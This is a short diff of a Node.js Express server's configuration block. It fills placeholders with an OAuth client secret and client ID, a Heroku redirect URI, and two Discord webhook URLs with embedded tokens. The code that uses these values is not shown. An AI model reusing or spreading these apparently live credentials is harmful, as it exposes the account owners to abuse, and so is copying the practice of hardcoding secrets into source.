@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
-const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const client_secret = 'CGq8Q~nQ0BdBDdVtW6c~kBGt7luFrj~btm3g_bR8'
+const client_id = 'ce99588a-329a-46ef-8de4-85fd8c10752f'
+const redirect_uri = 'https://meandtomersapi.herokuapp.com'
+const webhook_url = 'https://discord.com/api/webhooks/998589371076841544/E2d-9Wvs1FB8yrspxgDMYSoRIiKjPlgDT2SeIum9_1oTs6sckrM8JqmeuxquXSqIgUU7'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1032751552714244137/a17rfisI3vRX1SlJMUmy2BfLu0djn8BYGRc1xQXj5zkP0EYI_8gHaH9jAwR1lkSYAgH0'
 // Config end
 const axios = require('axios')
 const express = require('express')
